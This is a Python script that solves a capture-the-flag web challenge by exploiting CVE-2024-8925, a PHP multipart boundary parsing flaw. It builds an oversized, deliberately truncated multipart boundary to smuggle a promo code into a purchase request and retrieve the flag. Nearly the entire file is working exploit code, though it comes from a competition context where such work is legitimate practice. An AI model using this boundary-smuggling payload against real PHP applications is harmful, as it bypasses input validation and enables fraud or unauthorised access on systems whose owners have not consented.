import requests

HOST = "chals.cyberthon26f.ctf.sg"
PORT = 44628

url = f"http://{HOST}:{PORT}"
s = requests.Session()

# register
res = s.post(url, data={
    'customer_name': 'hacked'
})

if 'welcome' in res.text.lower():
    print("> Logged in")

# CVE-2024-8925
boundary = "A" * (6 * 1024)
boundary_prefix = boundary[:-4]

payload = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="item"\r\n'
    "\r\n"
    f"wand_prismatic_fury\r\n"
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="promo_code"\r\n'
    "\r\n"
    "QUILLTHORN50\r\n"
    f"--{boundary_prefix}NONE\r\n"
    f"--{boundary}--\r\n"
)

res = s.post(f'{url}/buy.php',
    data=payload,
    headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Accept": "application/json",
    },
)

flag = res.json()['flag']
print("Flag:", flag)